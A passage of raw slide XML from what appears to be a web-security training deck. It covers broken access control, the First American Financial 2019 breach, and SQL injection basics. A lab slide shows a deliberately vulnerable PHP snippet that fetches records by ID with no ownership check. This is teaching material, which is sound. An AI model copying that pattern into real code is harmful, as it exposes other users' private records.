          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="242" name="Google Shape;242;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="32918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Read &amp; modify other accounts</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="243" name="Google Shape;243;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="365760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View PII, change emails, reset other people's settings.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="244" name="Google Shape;244;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4572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45" name="Google Shape;245;p15"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="4728911"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="246" name="Google Shape;246;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="452628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Reach restricted objects</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="247" name="Google Shape;247;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="489204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Hit records and admin resources you were never meant to touch.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="248" name="Google Shape;248;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6766560" y="2011680"/>
            <a:ext cx="4800600" cy="3931920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 186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9" name="Google Shape;249;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="22860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100"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1100" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="D29922"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>WAR STORY</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1100" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="250" name="Google Shape;250;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="2615184"/>
            <a:ext cx="41605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1800"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1800" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>First American Financial, 2019</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="251" name="Google Shape;251;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="3200400"/>
            <a:ext cx="41605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4800"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="4800" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="F85149"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>885M</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="4800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="252" name="Google Shape;252;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="4023360"/>
            <a:ext cx="4160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records exposed</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1100" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="253" name="Google Shape;253;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="4434840"/>
            <a:ext cx="4160520" cy="132588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Sequential document URLs needed no login at all - anyone could increment the number and read 16 years of mortgage files: SSNs, bank accounts, and tax records.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="254" name="Google Shape;254;p15"/>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5"/>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256" name="Google Shape;256;p15"/>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1" name="Shape 261"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="262" name="Google Shape;262;p16"/>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LAB</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="263" name="Google Shape;263;p16"/>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LABS 00 &amp; 01</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="264" name="Google Shape;264;p16"/>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Read what isn't yours</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="2700" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="265" name="Google Shape;265;p16"/>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16"/>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267" name="Google Shape;267;p16"/>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labs · /lab00 and /lab01</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="268" name="Google Shape;268;p16"/>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16"/>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270" name="Google Shape;270;p16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="4142232"/>
            <a:ext cx="4480560" cy="8686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Open a record that isn't yours. </a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1350" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="271" name="Google Shape;271;p16"/>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the full app hides it better</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="950" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="272" name="Google Shape;272;p16"/>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16"/>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16"/>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16"/>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16"/>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277" name="Google Shape;277;p16"/>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278" name="Google Shape;278;p16"/>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lab 00: staff record by id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$id  = (int) $_GET['id'];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$row = $RECORDS[$id];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no check that it's yours</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="279" name="Google Shape;279;p16"/>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6"/>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281" name="Google Shape;281;p16"/>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6" name="Shape 286"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="287" name="Google Shape;287;p18"/>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03</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="30000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="288" name="Google Shape;288;p18"/>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89" name="Google Shape;289;p18"/>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290" name="Google Shape;290;p18"/>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INJECTION · SQL</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="291" name="Google Shape;291;p18"/>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SQL injection</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="4600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="292" name="Google Shape;292;p18"/>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Your input becomes part of a query. Break out of the string, change the logic.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="293" name="Google Shape;293;p18"/>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4" name="Google Shape;294;p18"/>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295" name="Google Shape;295;p18"/>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0" name="Shape 300"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="301" name="Google Shape;301;p19"/>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DEFINITION</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="302" name="Google Shape;302;p19"/>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is SQL injection?</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="303" name="Google Shape;303;p19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2011680"/>
            <a:ext cx="1060704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4" name="Google Shape;304;p19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1005840" y="2194560"/>
            <a:ext cx="987552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FB950"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1600" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>SQLi</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1600" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t> occurs when untrusted input is placed into a SQL query without parameterization, letting an attacker alter the query's logic - bypass authentication, read or modify data they shouldn't, even run database commands.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="305" name="Google Shape;305;p19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3657600"/>
            <a:ext cx="3383280" cy="2148840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 3404"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19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="3931920"/>
            <a:ext cx="566928" cy="566928"/>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07" name="Google Shape;307;p19"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1061801" y="4079321"/>
            <a:ext cx="272125" cy="272125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="308" name="Google Shape;308;p19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="4617720"/>
            <a:ext cx="2834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Bypass authentication</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="309" name="Google Shape;309;p19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="5074920"/>
            <a:ext cx="28346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Log in as admin, no password.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="310" name="Google Shape;310;p19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4251960" y="3657600"/>
            <a:ext cx="3383280" cy="2148840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 3404"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19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4526280" y="3931920"/>
            <a:ext cx="566928" cy="566928"/>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12" name="Google Shape;312;p19"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4673681" y="4079321"/>
            <a:ext cx="272125" cy="272125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="313" name="Google Shape;313;p19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4526280" y="4617720"/>
            <a:ext cx="2834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Dump the database</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="314" name="Google Shape;314;p19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4526280" y="5074920"/>
            <a:ext cx="28346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Users, hashes, secrets.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="315" name="Google Shape;315;p19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7863840" y="3657600"/>
            <a:ext cx="3383280" cy="2148840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 3404"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p19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="3931920"/>
            <a:ext cx="566928" cy="566928"/>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17" name="Google Shape;317;p19"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8285561" y="4079321"/>
            <a:ext cx="272125" cy="272125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="318" name="Google Shape;318;p19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="4617720"/>
            <a:ext cx="2834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Modify / pivot</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="319" name="Google Shape;319;p19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="5074920"/>
            <a:ext cx="28346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Write records, forge tokens.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="320" name="Google Shape;320;p19"/>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19"/>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322" name="Google Shape;322;p19"/>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27" name="Shape 327"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="328" name="Google Shape;328;p20"/>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1200"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="F85149"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>REAL-WORLD IMPACT</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="329" name="Google Shape;329;p20"/>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attackers actually do with SQLi</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="330" name="Google Shape;330;p20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="21031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1" name="Google Shape;331;p20"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
